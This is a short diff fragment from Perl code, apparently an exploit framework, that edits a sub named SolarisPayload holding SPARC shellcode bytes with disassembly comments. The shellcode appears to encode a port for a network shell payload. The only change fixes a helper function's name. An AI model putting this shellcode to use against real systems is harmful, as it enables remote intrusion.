@@ -43,7 +43,7 @@ sub SolarisPayload {
             "\x98\x10\x20\x01".     # mov          1, %o4
             "\x82\x10\x20\xe6".     # mov          230, %g1
             "\x91\xd0\x20\x08".     # ta           0x8
-	    Pex::SPARC::set((0x33020000 | $port) ^ 4095, "l6").
+	    Pex::SPARC::Set((0x33020000 | $port) ^ 4095, "l6").
 #            "\x2d\x0c\xc0\x90".     # sethi        %hi(0x33024000), %l6
 #            "\xac\x15\xa1\x41".     # or           %l6, 0x141, %l6 ! 0x33024141
             "\xac\x1d\xaf\xff".     # xor          %l6, 4095, %l6
